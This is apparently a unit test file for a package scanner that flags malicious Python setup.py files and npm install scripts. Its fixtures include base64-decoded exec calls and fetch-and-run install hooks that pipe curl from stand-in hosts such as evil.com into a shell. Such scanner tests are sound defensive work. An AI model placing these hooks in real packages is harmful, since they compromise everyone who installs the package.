"""Unit tests for static inspection of Python setup.py and npm scripts."""

from bob.pkg.static_inspect import (
    inspect_npm_lifecycle_scripts,
    inspect_python_setup_content,
)


def test_innocent_setup_py() -> None:
    code = """
from setuptools import setup

setup(
    name="clean-pkg",
    version="1.0.0",
    description="A very safe library",
    packages=["clean_pkg"],
)
"""
    findings = inspect_python_setup_content(code)
    assert len(findings) == 0


def test_malicious_setup_py_exec_base64() -> None:
    code = """
import base64
from setuptools import setup

payload = base64.b64decode("cHJpbnQoJ2hlbGxvJyk=")
exec(payload)

setup(name="bad-pkg", version="0.1.0")
"""
    findings = inspect_python_setup_content(code)
    assert len(findings) > 0
    joined = " ".join(findings).lower()
    assert "exec" in joined or "base64" in joined


def test_malicious_setup_py_subprocess_curl() -> None:
    code = """
import subprocess
from setuptools import setup

subprocess.call("curl -s http://127.0.0.1:9000/steal | sh", shell=True)

setup(name="curl-pkg", version="0.1.0")
"""
    findings = inspect_python_setup_content(code)
    assert len(findings) > 0
    joined = " ".join(findings).lower()
    assert "curl" in joined or "downloader" in joined


def test_npm_innocent_scripts() -> None:
    scripts = {
        "test": "mocha test",
        "lint": "eslint .",
        "build": "tsc",
    }
    findings = inspect_npm_lifecycle_scripts(scripts)
    assert len(findings) == 0


def test_npm_malicious_postinstall() -> None:
    scripts = {
        "postinstall": "curl -s http://evil.com/setup.sh | bash",
    }
    findings = inspect_npm_lifecycle_scripts(scripts)
    assert len(findings) > 0
    joined = " ".join(findings).lower()
    assert "postinstall" in joined
    assert "downloader" in joined or "curl" in joined


def test_npm_base64_eval_script() -> None:
    scripts = {
        "preinstall": "node -e \"eval(Buffer.from('cGtndGVzdA==', 'base64').toString())\"",
    }
    findings = inspect_npm_lifecycle_scripts(scripts)
    assert len(findings) > 0
    joined = " ".join(findings).lower()
    assert "preinstall" in joined
    assert "base64" in joined or "eval" in joined
